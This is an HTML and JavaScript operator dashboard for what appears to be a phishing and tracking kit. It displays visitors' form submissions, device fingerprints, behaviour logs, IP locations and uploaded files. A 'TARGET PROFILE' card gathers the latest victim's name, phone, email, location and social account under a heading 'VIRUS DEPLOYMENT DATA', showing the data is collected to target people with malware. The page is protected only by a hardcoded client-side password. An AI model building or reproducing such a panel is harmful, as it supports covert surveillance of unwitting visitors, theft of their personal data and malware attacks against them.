<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Score Dashboard</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Segoe UI',sans-serif;background:#0a0a0a;min-height:100vh;padding:20px;color:#fff}
        .login-box{background:#1a1a2e;padding:40px 36px;border-radius:16px;box-shadow:0 8px 40px rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.05);max-width:400px;margin:20px auto}
        .login-box .icon{font-size:48px;display:block;text-align:center;margin-bottom:12px}
        .login-box h1{font-size:24px;font-weight:800;text-align:center}
        .login-box .sub{text-align:center;color:#888;font-size:13px;margin-bottom:24px}
        .login-box input[type="password"]{width:100%;padding:12px 16px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:10px;font-size:15px;outline:none;color:#fff}
        .login-box input[type="password"]:focus{border-color:#ffd700}
        .login-box button{width:100%;padding:12px;background:linear-gradient(135deg,#ffd700,#f5a623);color:#000;font-weight:700;font-size:15px;border:none;border-radius:10px;cursor:pointer;margin-top:8px}
        .login-box button:hover{transform:scale(1.01)}
        .login-box .error{color:#ff4444;text-align:center;margin-top:12px;display:none}
        .container{max-width:1200px;margin:0 auto;display:none}
        .header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;flex-wrap:wrap;gap:10px}
        .header h1{font-size:24px;font-weight:800}
        .header .sub{color:#888;font-size:12px}
        .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(100px,1fr));gap:10px;margin-bottom:16px}
        .stat-box{background:#1a1a2e;padding:12px 16px;border-radius:8px;border:1px solid rgba(255,255,255,0.05);text-align:center}
        .stat-box .num{font-size:20px;font-weight:800;color:#ffd700}
        .stat-box .label{font-size:9px;color:#888}
        .card{background:#1a1a2e;border-radius:8px;border:1px solid rgba(255,255,255,0.05);margin-bottom:12px;overflow:hidden}
        .card-header{padding:10px 14px;border-bottom:1px solid rgba(255,255,255,0.05);font-weight:600;font-size:12px;display:flex;justify-content:space-between;color:#fff}
        .card-header .count{font-weight:400;color:#888;font-size:10px}
        .card-body{padding:10px 14px;max-height:350px;overflow-y:auto}
        .card-body pre{background:#0a0a0a;padding:10px;border-radius:6px;font-size:9px;overflow-x:auto;white-space:pre-wrap;word-break:break-all;border:1px solid rgba(255,255,255,0.05);color:#aaa;margin:0}
        .empty{color:#666;text-align:center;padding:16px;font-style:italic;font-size:12px}
        .badge{display:inline-block;padding:1px 8px;border-radius:50px;font-size:8px;font-weight:600}
        .badge.form{background:#27ae60;color:#fff}
        .badge.upload{background:#2980b9;color:#fff}
        .badge.fingerprint{background:#8e44ad;color:#fff}
        .badge.behavior{background:#e67e22;color:#fff}
        .badge.location{background:#2c3e50;color:#fff}
        .btn{display:inline-block;padding:3px 12px;background:#ffd700;color:#000;border-radius:50px;text-decoration:none;font-size:9px;font-weight:600;border:none;cursor:pointer}
        .btn:hover{background:#f5a623}
        .btn-danger{background:#e74c3c;color:#fff;padding:3px 12px}
        .btn-danger:hover{background:#c0392b}
        .gallery-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:10px;padding:8px 0}
        .gallery-item{background:#0a0a0a;border-radius:6px;border:1px solid rgba(255,255,255,0.05);overflow:hidden;cursor:pointer}
        .gallery-item img{width:100%;height:100px;object-fit:cover;display:block}
        .gallery-item .info{padding:4px 8px;font-size:9px;font-weight:600;color:#aaa;word-break:break-all}
        .modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.9);z-index:999;align-items:center;justify-content:center;padding:20px}
        .modal.active{display:flex}
        .modal-content{max-width:90%;max-height:90%;background:#1a1a2e;border-radius:10px;overflow:hidden;position:relative;border:1px solid rgba(255,255,255,0.1)}
        .modal-content .close{position:absolute;top:8px;right:12px;font-size:24px;color:#fff;cursor:pointer;background:rgba(0,0,0,0.6);width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;border:none;z-index:10}
        .modal-content img{max-width:100%;max-height:80vh;display:block;margin:0 auto}
        .refresh{display:inline-block;margin-left:8px;padding:2px 10px;background:rgba(255,255,255,0.05);border-radius:50px;font-size:9px;color:#888;text-decoration:none;cursor:pointer;border:1px solid rgba(255,255,255,0.05)}
        .refresh:hover{background:rgba(255,255,255,0.1)}
        ::-webkit-scrollbar{width:3px}
        ::-webkit-scrollbar-track{background:#0a0a0a}
        ::-webkit-scrollbar-thumb{background:#ffd700;border-radius:10px}
        @media(max-width:600px){.stats{grid-template-columns:1fr 1fr}.gallery-grid{grid-template-columns:1fr 1fr}}
        .data-tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px}
        .data-tabs button{background:rgba(255,255,255,0.03);color:#888;border:1px solid rgba(255,255,255,0.05);padding:6px 14px;border-radius:6px;cursor:pointer;font-size:11px;transition:0.3s}
        .data-tabs button:hover{background:rgba(255,255,255,0.06);color:#fff}
        .data-tabs button.active{background:rgba(255,215,0,0.08);color:#ffd700;border-color:rgba(255,215,0,0.2)}
        .loading{text-align:center;padding:40px;color:#888}
        .loading .spinner{display:inline-block;width:30px;height:30px;border:2px solid rgba(255,255,255,0.1);border-top-color:#ffd700;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:10px}
        @keyframes spin{to{transform:rotate(360deg)}}
    </style>
</head>
<body>

<div id="loginScreen" class="login-box">
    <span class="icon">🔒</span>
    <h1>Score Dashboard</h1>
    <p class="sub">Enter password to view data</p>
    <form id="loginForm">
        <input type="password" id="loginPassword" placeholder="Enter password" required autofocus>
        <button type="submit">Unlock →</button>
        <div class="error" id="loginError">Invalid password</div>
    </form>
</div>

<div id="dashboard" class="container">
    <div class="header">
        <div>
            <h1>📊 Score Dashboard</h1>
            <span class="sub" id="entryCount">Loading...</span>
            <span class="refresh" onclick="loadAllData()">↻ Refresh</span>
            <button class="btn" onclick="exportData()">📥 Export</button>
        </div>
        <button class="btn btn-danger" onclick="logout()" style="background:#e74c3c;color:#fff;">🚪 Logout</button>
    </div>
    <div class="stats" id="stats">
        <div class="stat-box"><div class="num" id="totalCount">0</div><div class="label">Total</div></div>
        <div class="stat-box"><div class="num" id="formCount">0</div><div class="label">Forms</div></div>
        <div class="stat-box"><div class="num" id="fingerprintCount">0</div><div class="label">Fingerprints</div></div>
        <div class="stat-box"><div class="num" id="behaviorCount">0</div><div class="label">Behavior</div></div>
        <div class="stat-box"><div class="num" id="locationCount">0</div><div class="label">Locations</div></div>
        <div class="stat-box"><div class="num" id="uploadCount">0</div><div class="label">Uploads</div></div>
    </div>
    
    <div class="data-tabs">
        <button class="active" onclick="showTab('submissions')">📋 Submissions</button>
        <button onclick="showTab('fingerprints')">🔍 Fingerprints</button>
        <button onclick="showTab('behavior')">👆 Behavior</button>
        <button onclick="showTab('locations')">📍 Locations</button>
        <button onclick="showTab('uploads')">📁 Uploads</button>
    </div>
    
    <div id="dataContent"><div class="loading"><div class="spinner"></div><div>Loading data...</div></div></div>
</div>

<div class="modal" id="imageModal" onclick="closeModal()">
    <div class="modal-content" onclick="event.stopPropagation()">
        <button class="close" onclick="closeModal()">✕</button>
        <img id="modalImage" src="">
    </div>
</div>

<script>
const PASSWORD = '9990';
const BACKEND_URL = window.location.origin;
let allData = {};
let currentTab = 'submissions';

function loadAllData() {
    const dataContent = document.getElementById('dataContent');
    dataContent.innerHTML = '<div class="loading"><div class="spinner"></div><div>Loading data...</div></div>';
    
    fetch(BACKEND_URL + '/api/all')
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.json();
    })
    .then(data => {
        allData = data;
        const submissions = data.submissions || [];
        const fingerprints = data.fingerprints || [];
        const behaviors = data.behaviors || [];
        const locations = data.locations || [];
        const uploads = submissions.filter(d => d.file);
        
        document.getElementById('entryCount').textContent = submissions.length + ' entries';
        document.getElementById('totalCount').textContent = submissions.length + fingerprints.length + behaviors.length + locations.length;
        document.getElementById('formCount').textContent = submissions.length;
        document.getElementById('fingerprintCount').textContent = fingerprints.length;
        document.getElementById('behaviorCount').textContent = behaviors.length;
        document.getElementById('locationCount').textContent = locations.length;
        document.getElementById('uploadCount').textContent = uploads.length;
        
        renderTab(currentTab);
    })
    .catch(error => {
        console.error('Error loading data:', error);
        document.getElementById('dataContent').innerHTML = '<div class="empty">❌ Error loading data. Please refresh.</div>';
    });
}

function renderTab(tab) {
    currentTab = tab;
    const data = allData;
    const submissions = data.submissions || [];
    const fingerprints = data.fingerprints || [];
    const behaviors = data.behaviors || [];
    const locations = data.locations || [];
    const uploads = submissions.filter(d => d.file);
    
    let html = '';
    
    // Update tab buttons
    document.querySelectorAll('.data-tabs button').forEach(btn => {
        btn.classList.remove('active');
        const btnText = btn.textContent;
        if ((tab === 'submissions' && btnText.includes('Submissions')) ||
            (tab === 'fingerprints' && btnText.includes('Fingerprints')) ||
            (tab === 'behavior' && btnText.includes('Behavior')) ||
            (tab === 'locations' && btnText.includes('Locations')) ||
            (tab === 'uploads' && btnText.includes('Uploads'))) {
            btn.classList.add('active');
        }
    });
    
    if (tab === 'submissions') {
        // Target Profile
        if (submissions.length > 0) {
            const latest = submissions[submissions.length - 1];
            html += `
                <div style="background:linear-gradient(135deg,#1a1a2e,#2d2d44);border:1px solid rgba(255,215,0,0.15);padding:14px 18px;border-radius:8px;margin-bottom:12px;">
                    <h3 style="color:#ffd700;font-size:13px;margin-bottom:6px;">🎯 TARGET PROFILE</h3>
                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:4px;">
                        <div style="font-size:11px;color:#aaa;"><strong style="color:#fff;">Name:</strong> ${latest.fullname || 'Unknown'}</div>
                        <div style="font-size:11px;color:#aaa;"><strong style="color:#fff;">Phone:</strong> ${latest.phone || 'Unknown'}</div>
                        <div style="font-size:11px;color:#aaa;"><strong style="color:#fff;">Email:</strong> ${latest.email || 'Unknown'}</div>
                        <div style="font-size:11px;color:#aaa;"><strong style="color:#fff;">Location:</strong> ${latest.location || 'Unknown'}</div>
                        <div style="font-size:11px;color:#aaa;"><strong style="color:#fff;">Experience:</strong> ${latest.experience || 'Unknown'}</div>
                        <div style="font-size:11px;color:#aaa;"><strong style="color:#fff;">Social:</strong> ${latest.social || 'Unknown'}</div>
                    </div>
                    <div style="background:rgba(231,76,60,0.08);border:1px solid rgba(231,76,60,0.1);padding:10px 14px;border-radius:6px;margin-top:8px;">
                        <h4 style="color:#e74c3c;font-size:11px;margin-bottom:2px;">⚡ VIRUS DEPLOYMENT DATA</h4>
                        <div style="font-size:10px;color:#aaa;">📱 SMS: ${latest.phone || 'No phone'}</div>
                        <div style="font-size:10px;color:#aaa;">📧 Email: ${latest.email || 'No email'}</div>
                        <div style="font-size:10px;color:#aaa;">📍 Location: ${latest.location || 'Unknown'}</div>
                        <div style="font-size:10px;color:#aaa;">🔗 Social: ${latest.social || 'Unknown'}</div>
                    </div>
                </div>
            `;
        }
        
        html += `
            <div class="card">
                <div class="card-header"><span>📋 Form Submissions</span><span class="count"><span class="badge form">${submissions.length}</span></span></div>
                <div class="card-body">${submissions.length > 0 ? `<pre>${JSON.stringify(submissions, null, 2)}</pre>` : '<div class="empty">No submissions</div>'}</div>
            </div>
        `;
    } else if (tab === 'fingerprints') {
        html += `
            <div class="card">
                <div class="card-header"><span>🔍 Device Fingerprints</span><span class="count"><span class="badge fingerprint">${fingerprints.length}</span></span></div>
                <div class="card-body">${fingerprints.length > 0 ? `<pre>${JSON.stringify(fingerprints, null, 2)}</pre>` : '<div class="empty">No fingerprints yet. Wait for a user to visit.</div>'}</div>
            </div>
        `;
    } else if (tab === 'behavior') {
        html += `
            <div class="card">
                <div class="card-header"><span>👆 Behavior Tracking</span><span class="count"><span class="badge behavior">${behaviors.length}</span></span></div>
                <div class="card-body">${behaviors.length > 0 ? `<pre>${JSON.stringify(behaviors, null, 2)}</pre>` : '<div class="empty">No behavior data yet.</div>'}</div>
            </div>
        `;
    } else if (tab === 'locations') {
        html += `
            <div class="card">
                <div class="card-header"><span>📍 IP Locations</span><span class="count"><span class="badge location">${locations.length}</span></span></div>
                <div class="card-body">${locations.length > 0 ? `<pre>${JSON.stringify(locations, null, 2)}</pre>` : '<div class="empty">No location data yet.</div>'}</div>
            </div>
        `;
    } else if (tab === 'uploads') {
        html += `
            <div class="card">
                <div class="card-header"><span>📁 Uploaded Files</span><span class="count"><span class="badge upload">${uploads.length}</span></span></div>
                <div class="card-body">${uploads.length > 0 ? `<div class="gallery-grid">${uploads.map(u => `
                    <div class="gallery-item" onclick="openImage('/uploads/${u.file}')">
                        <img src="/uploads/${u.file}" alt="${u.file}" loading="lazy">
                        <div class="info">${u.file}</div>
                    </div>
                `).join('')}</div>` : '<div class="empty">No uploads</div>'}</div>
            </div>
        `;
    }
    
    document.getElementById('dataContent').innerHTML = html;
}

function showTab(tab) {
    renderTab(tab);
}

function exportData() {
    const blob = new Blob([JSON.stringify(allData, null, 2)], {type: 'application/json'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'wrsf_data_' + new Date().toISOString().slice(0,10) + '.json';
    a.click();
    URL.revokeObjectURL(url);
}

function openImage(src) {
    document.getElementById('modalImage').src = src;
    document.getElementById('imageModal').classList.add('active');
    document.body.style.overflow = 'hidden';
}

function closeModal() {
    document.getElementById('imageModal').classList.remove('active');
    document.body.style.overflow = '';
}

function logout() {
    sessionStorage.removeItem('score_auth');
    document.getElementById('loginScreen').style.display = 'block';
    document.getElementById('dashboard').style.display = 'none';
    document.getElementById('loginPassword').value = '';
}

document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    if (document.getElementById('loginPassword').value === PASSWORD) {
        sessionStorage.setItem('score_auth', 'true');
        document.getElementById('loginScreen').style.display = 'none';
        document.getElementById('dashboard').style.display = 'block';
        loadAllData();
    } else {
        document.getElementById('loginError').style.display = 'block';
        setTimeout(() => { document.getElementById('loginError').style.display = 'none'; }, 3000);
    }
});

document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') closeModal();
});

if (sessionStorage.getItem('score_auth') === 'true') {
    document.getElementById('loginScreen').style.display = 'none';
    document.getElementById('dashboard').style.display = 'block';
    loadAllData();
}

// Auto-refresh every 30 seconds
setInterval(() => {
    if (sessionStorage.getItem('score_auth') === 'true') {
        loadAllData();
    }
}, 30000);
</script>
</body>
</html>
